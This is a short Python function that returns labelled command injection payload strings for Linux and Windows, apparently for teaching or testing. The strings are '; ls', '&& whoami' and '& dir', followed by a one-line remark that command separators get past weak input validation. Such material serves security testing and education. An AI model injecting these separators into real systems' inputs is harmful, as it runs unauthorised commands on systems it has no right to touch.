def generate_cmd_payloads():
    payloads = []

    payloads.append("[Linux Command Injection Example]")
    payloads.append("; ls")

    payloads.append("\n[Linux AND Operator]")
    payloads.append("&& whoami")

    payloads.append("\n[Windows Command Injection Example]")
    payloads.append("& dir")

    payloads.append("\n[Filter Bypass Concept]")
    payloads.append("Command separators bypass weak input validation")

    return payloads